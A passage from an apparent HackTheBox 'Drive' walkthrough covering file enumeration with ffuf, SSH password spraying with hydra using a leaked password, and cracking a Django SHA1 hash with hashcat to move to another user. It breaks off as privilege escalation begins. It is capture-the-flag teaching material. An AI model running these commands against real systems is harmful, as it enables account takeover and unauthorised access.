+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Drive]
+</span></span><span class="line"><span class="cl">└─$ ffuf -u http://drive.htb/FUZZ/block -w nums.txt -b &#34;sessionid=7ma2mz3s3kr3so2f2f2we9l0m6af034g&#34; -r
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        /&#39;___\  /&#39;___\           /&#39;___\       
+</span></span><span class="line"><span class="cl">       /\ \__/ /\ \__/  __  __  /\ \__/       
+</span></span><span class="line"><span class="cl">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+</span></span><span class="line"><span class="cl">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+</span></span><span class="line"><span class="cl">         \ \_\   \ \_\  \ \____/  \ \_\       
+</span></span><span class="line"><span class="cl">          \/_/    \/_/   \/___/    \/_/       
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">       v2.1.0-dev
+</span></span><span class="line"><span class="cl">________________________________________________
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> :: Method           : GET
+</span></span><span class="line"><span class="cl"> :: URL              : http://drive.htb/FUZZ/block
+</span></span><span class="line"><span class="cl"> :: Wordlist         : FUZZ: /home/kali/Documents/Drive/nums.txt
+</span></span><span class="line"><span class="cl"> :: Header           : Cookie: sessionid=7ma2mz3s3kr3so2f2f2we9l0m6af034g
+</span></span><span class="line"><span class="cl"> :: Follow redirects : true
+</span></span><span class="line"><span class="cl"> :: Calibration      : false
+</span></span><span class="line"><span class="cl"> :: Timeout          : 10
+</span></span><span class="line"><span class="cl"> :: Threads          : 40
+</span></span><span class="line"><span class="cl"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+</span></span><span class="line"><span class="cl">________________________________________________
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">79                      [Status: 200, Size: 5438, Words: 1216, Lines: 175, Duration: 138ms]
+</span></span><span class="line"><span class="cl">99                      [Status: 200, Size: 5058, Words: 1110, Lines: 171, Duration: 85ms]
+</span></span><span class="line"><span class="cl">98                      [Status: 200, Size: 5016, Words: 1103, Lines: 171, Duration: 91ms]
+</span></span><span class="line"><span class="cl">100                     [Status: 200, Size: 5077, Words: 1147, Lines: 172, Duration: 94ms]
+</span></span><span class="line"><span class="cl">101                     [Status: 200, Size: 5478, Words: 1232, Lines: 177, Duration: 107ms]
+</span></span><span class="line"><span class="cl">:: Progress: [105/105] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Since viewing these files requires a login, we must supply the sessionid cookie from our browser session. We also need the <code>-r</code> flag to follow the 301 redirect. Now viewing the other files:
+98:
+<img src="/p/hackthebox-drive/Images/98.png"
+	width="861"
+	height="421"
+	srcset="/p/hackthebox-drive/Images/98_hu12988159044927188681.png 480w, /p/hackthebox-drive/Images/98_hu6590195994661288254.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="204"
+		data-flex-basis="490px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">hi team  
+</span></span><span class="line"><span class="cl">have a great day.  
+</span></span><span class="line"><span class="cl">we are testing the new edit functionality!  
+</span></span><span class="line"><span class="cl">it seems to work great!
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>99:
+<img src="/p/hackthebox-drive/Images/99.png"
+	width="863"
+	height="402"
+	srcset="/p/hackthebox-drive/Images/99_hu15756424184518678339.png 480w, /p/hackthebox-drive/Images/99_hu147444328996456436.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="214"
+		data-flex-basis="515px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">hi team  
+</span></span><span class="line"><span class="cl">please we have to stop using the document platform for the chat  
+</span></span><span class="line"><span class="cl">+I have fixed the security issues in the middleware  
+</span></span><span class="line"><span class="cl">thanks! :)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>79:
+<img src="/p/hackthebox-drive/Images/79.png"
+	width="960"
+	height="458"
+	srcset="/p/hackthebox-drive/Images/79_hu8570468429246710674.png 480w, /p/hackthebox-drive/Images/79_hu7598987611267314556.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="209"
+		data-flex-basis="503px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">hey team after the great success of the platform we need now to continue the work.  
+</span></span><span class="line"><span class="cl">on the new features for ours platform.  
+</span></span><span class="line"><span class="cl">I have created a user for martin on the server to make the workflow easier for you please use the password &#34;Xk4@KjyrYv8t194L!&#34;.  
+</span></span><span class="line"><span class="cl">please make the necessary changes to the code before the end of the month  
+</span></span><span class="line"><span class="cl">I will reach you soon with the token to apply your changes on the repo  
+</span></span><span class="line"><span class="cl">thanks!
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>From these messages, we can gather a password <code>Xk4@KjyrYv8t194L!</code> for user Martin. Additionally to note for the future, there are backups stored in <code>/var/www/backups/</code> that are protected with a very &ldquo;secure&rdquo; password.</p>
+<h2 id="foothold">Foothold
+</h2><h3 id="utilizing-password-shared-in-private-messages">Utilizing password shared in private messages
+</h3><p>Using hydra to spray name variants, we find that we can indeed ssh as martin:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Drive]
+</span></span><span class="line"><span class="cl">└─$ hydra -L users.txt -p &#39;Xk4@KjyrYv8t194L!&#39; ssh://drive.htb
+</span></span><span class="line"><span class="cl">Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in 
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl">[DATA] attacking ssh://drive.htb:22/
+</span></span><span class="line"><span class="cl">[22][ssh] host: drive.htb   login: martin   password: Xk4@KjyrYv8t194L!
+</span></span><span class="line"><span class="cl">1 of 1 target successfully completed, 1 valid password found
+</span></span><span class="line"><span class="cl">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-10-15 12:27:08
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="lateral-movement">Lateral Movement
+</h2><p>Enumerating open ports, we can see port 3000:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">martin@drive:~$ netstat -ntlp
+</span></span><span class="line"><span class="cl">(Not all processes could be identified, non-owned process info
+</span></span><span class="line"><span class="cl"> will not be shown, you would have to be root to see it all.)
+</span></span><span class="line"><span class="cl">Active Internet connections (only servers)
+</span></span><span class="line"><span class="cl">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+</span></span><span class="line"><span class="cl">tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
+</span></span><span class="line"><span class="cl">tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+</span></span><span class="line"><span class="cl">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+</span></span><span class="line"><span class="cl">tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
+</span></span><span class="line"><span class="cl">tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+</span></span><span class="line"><span class="cl">tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+</span></span><span class="line"><span class="cl">tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+</span></span><span class="line"><span class="cl">tcp6       0      0 :::3000                 :::*                    LISTEN      -                   
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Using <code>curl</code>, we can see that this is a gitea server:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">martin</span><span class="err">@</span><span class="n">drive</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">$</span> <span class="n">curl</span> <span class="n">localhost</span><span class="p">:</span><span class="mi">3000</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;!</span><span class="n">DOCTYPE</span> <span class="n">html</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">html</span> <span class="n">lang</span><span class="o">=</span><span class="s2">&#34;en-US&#34;</span> <span class="k">class</span><span class="o">=</span><span class="s2">&#34;theme-&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">head</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="n">meta</span> <span class="n">charset</span><span class="o">=</span><span class="s2">&#34;utf-8&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="n">meta</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;viewport&#34;</span> <span class="n">content</span><span class="o">=</span><span class="s2">&#34;width=device-width, initial-scale=1&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="n">title</span><span class="o">&gt;</span> <span class="n">Gitea</span><span class="p">:</span> <span class="n">Git</span> <span class="n">with</span> <span class="n">a</span> <span class="n">cup</span> <span class="n">of</span> <span class="n">tea</span><span class="o">&lt;/</span><span class="n">title</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;...</span><span class="n">SNIP</span><span class="o">...&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>To view in our web browser, we can utilize an <code>ssh</code> tunnel:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Drive]
+</span></span><span class="line"><span class="cl">└─$ ssh -L 3000:localhost:3000 martin@drive.htb
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now our kali machine is listening on local port 3000, and will forward requests to <code>drive.htb</code>&rsquo;s local port 3000.
+In the gitea service, we can login as martin and we can see DoodleGrive source code:</p>
+<p><img src="/p/hackthebox-drive/Images/DriveSource.png"
+	width="1211"
+	height="591"
+	srcset="/p/hackthebox-drive/Images/DriveSource_hu15594232701359745214.png 480w, /p/hackthebox-drive/Images/DriveSource_hu16666816853550566904.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="204"
+		data-flex-basis="491px"
+	
+></p>
+<p>Within <code>db_backup.sh</code>, we can view that the backup script leaks zip passwords:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="nv">DB</span><span class="o">=</span><span class="nv">$1</span>
+</span></span><span class="line"><span class="cl"><span class="nv">date_str</span><span class="o">=</span><span class="k">$(</span>date +<span class="s1">&#39;%d_%b&#39;</span><span class="k">)</span>
+</span></span><span class="line"><span class="cl">7z a -p<span class="s1">&#39;H@ckThisP@ssW0rDIfY0uC@n:)&#39;</span> /var/www/backups/<span class="si">${</span><span class="nv">date_str</span><span class="si">}</span>_db_backup.sqlite3.7z db.sqlite3
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> /var/www/backups/
+</span></span><span class="line"><span class="cl">ls -l --sort<span class="o">=</span>t *.7z &gt; backups_num.tmp
+</span></span><span class="line"><span class="cl"><span class="nv">backups_num</span><span class="o">=</span><span class="k">$(</span>cat backups_num.tmp <span class="p">|</span> wc -l<span class="k">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[[</span> <span class="nv">$backups_num</span> -gt <span class="m">10</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">      <span class="c1">#backups is more than 10... deleting to oldest backup</span>
+</span></span><span class="line"><span class="cl">      rm <span class="k">$(</span>ls  *.7z --sort<span class="o">=</span>t --color<span class="o">=</span>never <span class="p">|</span> tail -1<span class="k">)</span>
+</span></span><span class="line"><span class="cl">      <span class="c1">#oldest backup deleted successfully!</span>
+</span></span><span class="line"><span class="cl"><span class="k">fi</span>
+</span></span><span class="line"><span class="cl">rm backups_num.tmp
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>H@ckThisP@ssW0rDIfY0uC@n:)</code></p>
+<h3 id="abusing-weak-hash-algorithms-to-crack-database-passwords">Abusing weak hash algorithms to crack database passwords
+</h3><p>Before we get too far, it is worth noting the most recent commit on this gitea service:
+<code>retruning to the default Djnago hashers due to problems in Bcrypt hashers</code>
+When we view the commit changes, we see alterations to <code>geeks_site/settings.py</code>:</p>
+<p><img src="/p/hackthebox-drive/Images/gitchanges.png"
+	width="1172"
+	height="657"
+	srcset="/p/hackthebox-drive/Images/gitchanges_hu5976849224154721195.png 480w, /p/hackthebox-drive/Images/gitchanges_hu15084670830038779889.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="178"
+		data-flex-basis="428px"
+	
+></p>
+<p>We can see here that this is related to how data in the SQL database is being stored. It seems for some time they were using BCrypt hashes, which is very robust at the expense of processing power. However, it looks like they have recently switched to SHA256. Checking the commit history, we see that at one point they were using SHA1, which is massively easier to crack than SHA256 or Bcrypt:</p>
+<p><img src="/p/hackthebox-drive/Images/commithistory.png"
+	width="1132"
+	height="597"
+	srcset="/p/hackthebox-drive/Images/commithistory_hu17782490154124610131.png 480w, /p/hackthebox-drive/Images/commithistory_hu16170582520511589659.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="189"
+		data-flex-basis="455px"
+	
+></p>
+<p>Now, onto visiting the backup files:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">martin</span><span class="err">@</span><span class="n">drive</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">backups</span><span class="o">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">al</span>
+</span></span><span class="line"><span class="cl"><span class="n">total</span> <span class="mi">3740</span>
+</span></span><span class="line"><span class="cl"><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">2</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span>    <span class="mi">4096</span> <span class="n">Sep</span>  <span class="mi">1</span> <span class="mi">18</span><span class="p">:</span><span class="mi">23</span> <span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">5</span> <span class="n">root</span>     <span class="n">root</span>        <span class="mi">4096</span> <span class="n">Sep</span> <span class="mi">15</span> <span class="mi">13</span><span class="p">:</span><span class="mi">34</span> <span class="o">..</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span>   <span class="mi">13018</span> <span class="n">Sep</span>  <span class="mi">1</span> <span class="mi">20</span><span class="p">:</span><span class="mi">00</span> <span class="mi">1</span><span class="n">_Dec_db_backup</span><span class="o">.</span><span class="n">sqlite3</span><span class="o">.</span><span class="mi">7</span><span class="n">z</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span>   <span class="mi">12226</span> <span class="n">Sep</span>  <span class="mi">1</span> <span class="mi">20</span><span class="p">:</span><span class="mi">00</span> <span class="mi">1</span><span class="n">_Nov_db_backup</span><span class="o">.</span><span class="n">sqlite3</span><span class="o">.</span><span class="mi">7</span><span class="n">z</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span>   <span class="mi">12722</span> <span class="n">Sep</span>  <span class="mi">1</span> <span class="mi">20</span><span class="p">:</span><span class="mi">00</span> <span class="mi">1</span><span class="n">_Oct_db_backup</span><span class="o">.</span><span class="n">sqlite3</span><span class="o">.</span><span class="mi">7</span><span class="n">z</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span> <span class="n">www</span><span class="o">-</span><span class="n">data</span>   <span class="mi">12770</span> <span class="n">Sep</span>  <span class="mi">1</span> <span class="mi">20</span><span class="p">:</span><span class="mi">00</span> <span class="mi">1</span><span class="n">_Sep_db_backup</span><span class="o">.</span><span class="n">sqlite3</span><span class="o">.</span><span class="mi">7</span><span class="n">z</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span>     <span class="n">root</span>     <span class="mi">3760128</span> <span class="n">Dec</span> <span class="mi">26</span>  <span class="mi">2022</span> <span class="n">db</span><span class="o">.</span><span class="n">sqlite3</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The current <code>db.sqlite3</code> database does not contain any crackable passwords, but we should check the backup tables as well. Although this database is for the web service <code>Doodle Grive</code>, it is possible a user had originally used their system user password before changing.
+Here it would be nice to look at gitea&rsquo;s commit timestamps, and we could narrow down which month contains the SHA1 hashes. However, all of the commits are dated on Dec 25th so it is not helpful. Instead, we need to view each backup database and look for the signature <code>sha1$</code> before the salt. Unzipping from 7z requires the previously found password:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Drive]
+</span></span><span class="line"><span class="cl">└─$ 7z e 1_Dec_db_backup.sqlite3.7z
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+</span></span><span class="line"><span class="cl">p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs Intel(R) Core(TM) i5-4690K CPU @ 3.50GHz (306C3),ASM,AES-NI)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Scanning the drive for archives:
+</span></span><span class="line"><span class="cl">1 file, 13018 bytes (13 KiB)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Extracting archive: 1_Dec_db_backup.sqlite3.7z
+</span></span><span class="line"><span class="cl">--
+</span></span><span class="line"><span class="cl">Path = 1_Dec_db_backup.sqlite3.7z
+</span></span><span class="line"><span class="cl">Type = 7z
+</span></span><span class="line"><span class="cl">Physical Size = 13018
+</span></span><span class="line"><span class="cl">Headers Size = 170
+</span></span><span class="line"><span class="cl">Method = LZMA2:22 7zAES
+</span></span><span class="line"><span class="cl">Solid = -
+</span></span><span class="line"><span class="cl">Blocks = 1
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Enter password (will not be echoed):
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Size:       3760128
+</span></span><span class="line"><span class="cl">Compressed: 13018
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>December yields the sha256 hashes, which will take forever to crack. However, examining the November backup, we can see SHA1 passwords. Using <code>hashcat</code>, I am able to crack the password associated with user tomHands:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">spencer@MintySJ:~/Desktop$ hashcat -m 124 &#39;sha1$Ri2bP6RVoZD5XYGzeYWr7c$4053cb928103b6a9798b2521c4100db88969525a&#39; /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule 
+</span></span><span class="line"><span class="cl">hashcat (v6.2.5) starting
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl">sha1$Ri2bP6RVoZD5XYGzeYWr7c$4053cb928103b6a9798b2521c4100db88969525a:johnmayer7
+</span></span><span class="line"><span class="cl">                                                          
+</span></span><span class="line"><span class="cl">Session..........: hashcat
+</span></span><span class="line"><span class="cl">Status...........: Cracked
+</span></span><span class="line"><span class="cl">Hash.Mode........: 124 (Django (SHA-1))
+</span></span><span class="line"><span class="cl">Hash.Target......: sha1$Ri2bP6RVoZD5XYGzeYWr7c$4053cb928103b6a9798b252...69525a
+</span></span><span class="line"><span class="cl">Time.Started.....: Sun Oct 15 13:22:42 2023 (0 secs)
+</span></span><span class="line"><span class="cl">Time.Estimated...: Sun Oct 15 13:22:42 2023 (0 secs)
+</span></span><span class="line"><span class="cl">Kernel.Feature...: Pure Kernel
+</span></span><span class="line"><span class="cl">Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+</span></span><span class="line"><span class="cl">Guess.Mod........: Rules (/usr/share/hashcat/rules/best64.rule)
+</span></span><span class="line"><span class="cl">Guess.Queue......: 1/1 (100.00%)
+</span></span><span class="line"><span class="cl">Speed.#1.........:   567.5 MH/s (10.44ms) @ Accel:256 Loops:38 Thr:64 Vec:1
+</span></span><span class="line"><span class="cl">Recovered........: 1/1 (100.00%) Digests
+</span></span><span class="line"><span class="cl">Progress.........: 8093696/1104517568 (0.73%)
+</span></span><span class="line"><span class="cl">Rejected.........: 0/8093696 (0.00%)
+</span></span><span class="line"><span class="cl">Restore.Point....: 0/14344384 (0.00%)
+</span></span><span class="line"><span class="cl">Restore.Sub.#1...: Salt:0 Amplifier:0-38 Iteration:0-38
+</span></span><span class="line"><span class="cl">Candidate.Engine.: Device Generator
+</span></span><span class="line"><span class="cl">Candidates.#1....: 123456 -&gt; sex123
+</span></span><span class="line"><span class="cl">Hardware.Mon.#1..: Temp: 58c Fan: 19% Util: 73% Core:1316MHz Mem:3004MHz Bus:16
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Started: Sun Oct 15 13:22:42 2023
+</span></span><span class="line"><span class="cl">Stopped: Sun Oct 15 13:22:43 2023
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>tom cracks into <code>johnmayer7</code>. When checking system user credentials, it is the valid password for <code>tom</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">martin@drive:~$ su tom
+</span></span><span class="line"><span class="cl">Password: 
+</span></span><span class="line"><span class="cl">tom@drive:/home/martin$ 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="privilege-escalation">Privilege Escalation
+</h2><h3 id="extracting-stored-credentials-from-compiled-binary">Extracting stored credentials from compiled binary
+</h3><p>Within tom&rsquo;s home folder, we can find a <code>doodlegrive-cli</code> with SUID properties as root:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
